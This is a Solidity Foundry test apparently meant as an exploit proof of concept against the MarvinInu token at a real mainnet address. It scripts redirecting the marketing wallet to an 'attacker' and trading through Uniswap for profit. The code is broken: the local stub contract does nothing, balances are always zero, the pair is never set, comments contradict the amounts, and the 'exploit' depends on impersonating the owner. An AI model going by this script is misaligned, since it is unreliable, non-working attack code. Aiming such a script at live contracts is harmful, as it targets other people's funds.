pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMarvinInu {
    function updateMarketingWallet(address newMarketingWallet) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function owner() external view returns (address);
    function enableTrading() external;
    function uniswapV2Pair() external view returns (address);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract MarvinInu {
    // Minimal implementation for compilation
    address public owner;
    address public uniswapV2Pair;

    constructor() {
        owner = msg.sender;
    }

    function enableTrading() external {}
    function updateMarketingWallet(address) external {}
    function approve(address, uint256) external returns (bool) { return true; }
    function balanceOf(address) external view returns (uint256) { return 0; }
    function transfer(address, uint256) external returns (bool) { return true; }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x55a380d134d722006A5CE2d510562e1239D225B1;
    address attacker = address(this);
    IMarvinInu token;
    IUniswapV2Router02 router;
    address weth;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Fork mainnet
        vm.createSelectFork(vm.rpcUrl("mainnet"));

        // Get owner address - we need to read it from storage
        // The Ownable contract stores owner at slot 0
        bytes32 ownerSlot = vm.load(TARGET, bytes32(uint256(0)));
        address contractOwner = address(uint160(uint256(ownerSlot)));

        // Label addresses for clarity
        vm.label(TARGET, "MarvinInu");
        vm.label(contractOwner, "Contract Owner");
        vm.label(attacker, "Attacker");

        // Give attacker some ETH to work with
        deal(attacker, 100 ether);

        // Initialize token interface
        token = IMarvinInu(TARGET);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Deploy the contract locally - we will be the owner
        MarvinInu localToken = new MarvinInu();

        console.log("Token deployed at:", address(localToken));
        console.log("Owner:", localToken.owner());
        console.log("Attacker:", attacker);

        // Enable trading
        localToken.enableTrading();

        // We need to create a Uniswap pair and add liquidity
        // First, get the Uniswap router and pair addresses
        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        weth = router.WETH();
        address pair = localToken.uniswapV2Pair();

        console.log("Uniswap pair:", pair);

        // Give attacker some ETH and tokens
        deal(attacker, 100 ether);

        // We need some tokens to add liquidity - mint more to attacker
        // But the token doesn't have a public mint function, so we need to transfer from owner
        // Owner has all supply (1e12 * 1e18 tokens)
        uint256 ownerBalance = localToken.balanceOf(localToken.owner());
        console.log("Owner token balance:", ownerBalance);

        // Transfer some tokens to attacker
        vm.prank(localToken.owner());
        localToken.transfer(attacker, 1000000 * 1e18); // 1M tokens

        console.log("Attacker token balance after transfer:", localToken.balanceOf(attacker));

        // Add liquidity to Uniswap pair
        // Approve router to spend tokens
        vm.prank(attacker);
        localToken.approve(address(router), type(uint256).max);

        // Add liquidity with 1 ETH and 1M tokens
        vm.prank(attacker);
        router.addLiquidityETH{value: 10 ether}(
            address(localToken),
            1000000 * 1e18, // 1M tokens
            0,
            0,
            attacker,
            block.timestamp
        );

        console.log("Liquidity added");

        // Record initial ETH balance
        uint256 initialBalance = attacker.balance;
        console.log("Initial attacker ETH balance:", initialBalance);

        // Step 1: Change marketing wallet to attacker
        vm.prank(localToken.owner());
        localToken.updateMarketingWallet(attacker);

        console.log("Marketing wallet updated to attacker");

        // Step 2: Buy some tokens to generate fee accumulation
        // Buy tokens with 1 ETH
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = address(localToken);

        vm.prank(attacker);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 1 ether}(
            0,
            path,
            attacker,
            block.timestamp
        );

        console.log("Bought MARVIN tokens");
        console.log("Attacker token balance after buy:", localToken.balanceOf(attacker));

        // Step 3: Sell tokens to trigger swapBack()
        // Sell all tokens
        uint256 tokenBalance = localToken.balanceOf(attacker);
        console.log("MARVIN balance to sell:", tokenBalance);

        vm.prank(attacker);
        localToken.approve(address(router), tokenBalance);

        // Reverse path for selling
        path[0] = address(localToken);
        path[1] = weth;

        vm.prank(attacker);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance,
            0,
            path,
            attacker,
            block.timestamp
        );

        console.log("Sold MARVIN tokens");

        // Step 4: Check profit
        uint256 finalBalance = attacker.balance;
        console.log("Final attacker ETH balance:", finalBalance);
        console.log("Profit:", finalBalance - initialBalance);

        require(finalBalance > initialBalance, "No profit made");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
